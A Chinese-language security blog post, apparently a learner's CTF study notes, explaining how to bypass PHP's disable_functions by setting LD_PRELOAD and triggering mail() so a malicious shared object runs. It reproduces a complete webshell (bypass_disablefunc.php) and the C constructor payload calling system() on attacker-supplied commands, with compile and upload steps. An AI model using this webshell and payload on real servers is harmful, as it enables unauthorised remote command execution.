@@ -1,0 +1,617 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>利用LD_PRELOAD突破disable_functions学习 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="利用LD_PRELOAD突破disable_functions学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-04-26 14:55" pubdate>
+        2020年4月26日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      25
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">利用LD_PRELOAD突破disable_functions学习</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年12月2日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="１．前言"><a href="#１．前言" class="headerlink" title="１．前言"></a>１．前言</h1><p>​    安恒四月份月赛中的web2在做的时候，完全束手无策，有许多知识点，其中有一个就是要利用环境变量LD-PROELOAD突破目标disable_functions，让外部程序加载*.so文件，达到执行系统命令的效果。</p>
+<p>以下学习笔记，基本按照学习链接的知识来复现学习的。</p>
+<h1 id="２．学习链接"><a href="#２．学习链接" class="headerlink" title="２．学习链接"></a>２．学习链接</h1><p><a target="_blank" rel="noopener" href="https://jiang-niao.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E5%9B%9B%E6%9C%88wp/?tdsourcetag=s_pctim_aiomsg">Jiang-Niao’s Blog　大佬博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">freebuf中的一篇文章</a></p>
+<p><strong>摘抄一段思路：</strong></p>
+<blockquote>
+<p>​    设想这样一种思路：利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），a.bin 内部调用系统函数 b()，b() 位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，我想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的 c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，将突破 disable_functions 限制执行操作系统命令这一目标，大致分解成几步在本地推演：查看进程调用系统函数明细、操作系统环境下劫持系统函数注入代码、找寻内部启动新进程的 PHP 函数、PHP 环境下劫持系统函数注入代码。</p>
+</blockquote>
+<h1 id="３．复现学习过程"><a href="#３．复现学习过程" class="headerlink" title="３．复现学习过程"></a>３．复现学习过程</h1><p><strong>根据摘抄大佬的思路，我们分为几个步骤来进行</strong></p>
+<h2 id="１．查看进程调用系统明细"><a href="#１．查看进程调用系统明细" class="headerlink" title="１．查看进程调用系统明细"></a>１．查看进程调用系统明细</h2><p>​    linux在创建新的过程比较复杂，我们要进行劫持系统函数进行注入代码的话，我们需要大概了解进程加载了哪一些共享对象、可能调用哪一些ＡＰＩ、以及实际上调用哪一些ＡＰＩ</p>
+<p>例如：</p>
+<h3 id="１．调用共享对象的明细：我们可以用ldd-命令来查看系统为id程序命令加载的共享对象"><a href="#１．调用共享对象的明细：我们可以用ldd-命令来查看系统为id程序命令加载的共享对象" class="headerlink" title="１．调用共享对象的明细：我们可以用ldd 命令来查看系统为id程序命令加载的共享对象"></a>１．调用共享对象的明细：我们可以用ldd 命令来查看系统为id程序命令加载的共享对象</h3><p><img src="/2020/04/26/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions%E5%AD%A6%E4%B9%A0/1.png" srcset="/img/loading.gif"></p>
+<h3 id="２．调用API的明细：我们可以用readelf-Ws-usr-bin-id-来查看程序可能调用的系统API明细"><a href="#２．调用API的明细：我们可以用readelf-Ws-usr-bin-id-来查看程序可能调用的系统API明细" class="headerlink" title="２．调用ＡＰＩ的明细：我们可以用readelf -Ws /usr/bin/id 　来查看程序可能调用的系统ＡＰＩ明细"></a>２．调用ＡＰＩ的明细：我们可以用readelf -Ws /usr/bin/id 　来查看程序可能调用的系统ＡＰＩ明细</h3><p><img src="/2020/04/26/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions%E5%AD%A6%E4%B9%A0/2.png" srcset="/img/loading.gif"></p>
+<h3 id="３．实际调用API的明细：strace-f-usr-bin-id-2-gt-amp-1"><a href="#３．实际调用API的明细：strace-f-usr-bin-id-2-gt-amp-1" class="headerlink" title="３．实际调用ＡＰＩ的明细：strace -f /usr/bin/id 2&gt;&amp;1"></a>３．实际调用ＡＰＩ的明细：strace -f /usr/bin/id 2&gt;&amp;1</h3><p>​    由于程序运行时会根据命令行的选项、运行环境做出不同的反应，导致真正运行时调用的ＡＰＩ可能只是 readefl 查看的子集，你可以运行 strace -f /usr/bin/id 2&gt;&amp;1 跟踪实际 API 调用情况，比如，实际调用 open()    的入参、返回值一目了然：</p>
+<p>注意：strace该命令需要自己安装</p>
+<p><img src="/2020/04/26/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions%E5%AD%A6%E4%B9%A0/3.png" srcset="/img/loading.gif"></p>
+<h3 id="４．操作系统环境下劫持系统函数注入代码：通过LD-PRELOAD环境变量对指定的系统函数进行劫持。"><a href="#４．操作系统环境下劫持系统函数注入代码：通过LD-PRELOAD环境变量对指定的系统函数进行劫持。" class="headerlink" title="４．操作系统环境下劫持系统函数注入代码：通过LD_PRELOAD环境变量对指定的系统函数进行劫持。"></a>４．操作系统环境下劫持系统函数注入代码：通过LD_PRELOAD环境变量对指定的系统函数进行劫持。</h3><p>注意：由于被劫持的系统函数得有我们重新实现一遍，函数原型必须保持一致。</p>
+<p>为了减少复杂性，可以选择劫持那些无参数并且经常使用的系统函数，跟着大佬的步伐，我们选择用getuid()该系统函数。</p>
+<h4 id="完整劫持过程步骤如下："><a href="#完整劫持过程步骤如下：" class="headerlink" title="完整劫持过程步骤如下："></a>完整劫持过程步骤如下：</h4><p>１．首先使用man命令查看getuid()函数的原型</p>
+<p>使用的是man 2 getuid</p>
+<p><strong>注意：</strong>如果没有安装manpages-posix-dev这个额外的帮助包的话，是无法使用man 2 getuid查看的会提示：”在第 2 节中没有关于 getuid 的手册页条目”。</p>
+<p><img src="/2020/04/26/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions%E5%AD%A6%E4%B9%A0/4.png" srcset="/img/loading.gif"></p>
+<p>２．然后我们可以编写同原型的getuid()函数，保存到getuid_shadow.c</p>
+<p><img src="/2020/04/26/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions%E5%AD%A6%E4%B9%A0/5.png" srcset="/img/loading.gif"></p>
+<p>３．将我们的getuid_shadow变成共享对象</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-shared</span> <span class="hljs-selector-tag">-fPIC</span> <span class="hljs-selector-tag">getuid_shadow</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">getuid_shadow</span><span class="hljs-selector-class">.so</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/04/26/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions%E5%AD%A6%E4%B9%A0/6.png" srcset="/img/loading.gif"></p>
+<p>４．最后我们借助环境变量LD_PRELOAD劫持系统函数getuid()，获取控制权。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">LD_PRELOAD=<span class="hljs-regexp">/root/g</span>etuid_shadow.so <span class="hljs-regexp">/usr/</span>bin/id<br></code></pre></td></tr></table></figure>
+<p>我就使用kali机进行实验吧</p>
+<p><img src="/2020/04/26/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions%E5%AD%A6%E4%B9%A0/7.png" srcset="/img/loading.gif"></p>
+<p>注入的代码成功执行了</p>
+<p><strong>注意：</strong>LD_PRELOAD 是进程独占环境变量，类似于命令适配器，它与待执行命令间必须为空白字符，而非命令分隔符（;、&amp;&amp;、||）</p>
+<p>５．找寻内部启动新进程的ＰＨＰ函数</p>
+<p>​    现在这一切的操作都是我们在操作系统环境下进行的，虽然LD_PRELOAD环境变量提供了劫持系统函数的能力，但是前提是得控制ｐｈｐ外部程序才可以。只要能够有进程启动的行为能力就可以。</p>
+<p>​    上面学习链接的作者大佬就把目光瞄向了ｐｈｐ解释器自身（真是太强了，／（ㄒｏㄒ）／～～）</p>
+<p><strong>！！！大佬语录！！！</strong></p>
+<blockquote>
+<p>​    常见的 system() 启动程序方式显然不行，否则就不存在突破 disable_functions 一事了。PHP 脚本中除了调用 system()、exec()、shell_exec() 等等一堆 php 函数外，还有哪种可能启动外部程序呢？php 解释器自身！比如，php 函数 goForward() 实现“前进”的功能，php 函数 goForward() 又由组成 php 解释器的 C 语言模块之一的 move.c 实现，C 模块 move.c 内部又通过调用外部程序 go.bin 实现，那么，我的 php 脚本中调用了函数 goForward()，势必启动外部程序 go.bin。</p>
+</blockquote>
+<p><strong>继续根据大佬的路复现</strong></p>
+<p>寻找类似goForward()的真实存在的ｐｈｐ函数。</p>
+<p>１．尝试判断处理图片场景是否存在这类函数</p>
+<p><img src="/2020/04/26/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions%E5%AD%A6%E4%B9%A0/8.png" srcset="/img/loading.gif"></p>
+<p>第一个execve是启动ｐｈｐ解释器，只要存在第二个execve，才能说明有启动新进程</p>
+<p>２．最后大佬找到了mail()，该函数就可符合，他会内部启动/ust/sbin/sendmail、/usr/sbin/postdrop两个新进程</p>
+<p>​    我最后可以在kali中实现，但是在kali中mail()函数会在内部启动的进程是/usr/sbin/sendmail、usr/sbin/exim4这两个新进程。</p>
+<p><img src="/2020/04/26/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions%E5%AD%A6%E4%B9%A0/9.png" srcset="/img/loading.gif"></p>
+<p>我往原来的mail.php添加一段代码，并尝试</p>
+<p><img src="/2020/04/26/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions%E5%AD%A6%E4%B9%A0/10.png" srcset="/img/loading.gif"></p>
+<p>PS:我还用使用前面没有出现第二个execve的函数，进行相同的尝试，发现都不能正常执行，说明大佬的结论是正确的。</p>
+<p>以下的代码是大佬根据自己的结论写的一个小马和对应的c！！！牛逼，我们要做的就是使用　嘻嘻</p>
+<p>唯一条件，PHP 支持putenv()、mail() 即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;<br><br><span class="hljs-comment">##bypass_disablefunc.php 提供三个 GET 参数。一是 cmd 参数，待执行的系统命令（如 pwd）；二是 outpath 参数，保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外关于该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；三是 sopath 参数，指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。</span><br><br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br>    <span class="hljs-variable">$out_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;outpath&quot;</span>];<br>    <span class="hljs-variable">$evil_cmdline</span> = <span class="hljs-variable">$cmd</span> . <span class="hljs-string">&quot; &gt; &quot;</span> . <span class="hljs-variable">$out_path</span> . <span class="hljs-string">&quot; 2&gt;&amp;1&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="hljs-variable">$evil_cmdline</span> . <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br><span class="hljs-comment">##通过环境变量 EVIL_CMDLINE 向 bypass_disablefunc_x64.so 传递具体执行的命令行信息：</span><br>    putenv(<span class="hljs-string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="hljs-variable">$evil_cmdline</span>);<br><br>    <span class="hljs-variable">$so_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;sopath&quot;</span>];<br>    putenv(<span class="hljs-string">&quot;LD_PRELOAD=&quot;</span> . <span class="hljs-variable">$so_path</span>);<br><br>    mail(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . nl2br(file_get_contents(<span class="hljs-variable">$out_path</span>)) . <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>; <br><br>    unlink(<span class="hljs-variable">$out_path</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+<p><strong>bypass_disablefunc.c</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span>** environ;<br><span class="hljs-comment">//GCC 有个 C 语言扩展修饰符 __attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute__((constructor)) 修饰的函数。</span><br><br>__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">preload</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// get command line options and arg</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* cmdline = getenv(<span class="hljs-string">&quot;EVIL_CMDLINE&quot;</span>);<br><br>    <span class="hljs-comment">// unset environment variable LD_PRELOAD.</span><br>    <span class="hljs-comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br>    <span class="hljs-comment">// distribution (e.g., centos), I need crafty trick.</span><br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i]; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i], <span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)) &#123;<br>                    environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// executive command</span><br>    system(cmdline);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>1.将 bypass_disablefunc.c 编译为共享对象 bypass_disablefunc_x64.so</p>
+<p>你要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-shared</span> <span class="hljs-selector-tag">-fPIC</span> <span class="hljs-selector-tag">bypass_disablefunc</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">bypass_disablefunc_x64</span><span class="hljs-selector-class">.so</span><br></code></pre></td></tr></table></figure>
+<p>2.然后将该小马和该共享对象上传到目标网站</p>
+<p>3.用游览器访问</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.103</span><span class="hljs-regexp">/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/</span>tmp<span class="hljs-regexp">/xx&amp;sopath=/</span>var<span class="hljs-regexp">/www/</span>html/bypass_disablefunc_x64.so<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/04/26/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%AA%81%E7%A0%B4disable-functions%E5%AD%A6%E4%B9%A0/11.png" srcset="/img/loading.gif"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/PHP%E5%AE%89%E5%85%A8/">PHP安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/WEB/">WEB</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/04/27/%E5%AF%B9p%E7%A5%9E%E5%8D%9A%E5%AE%A2%E7%9A%84%E7%BB%8F%E5%85%B8%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">对p神博客的经典配置漏洞与几种变形学习笔记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/04/25/PHP%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/">
+                        <span class="hidden-mobile">PHP字符逃逸导致的对象注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
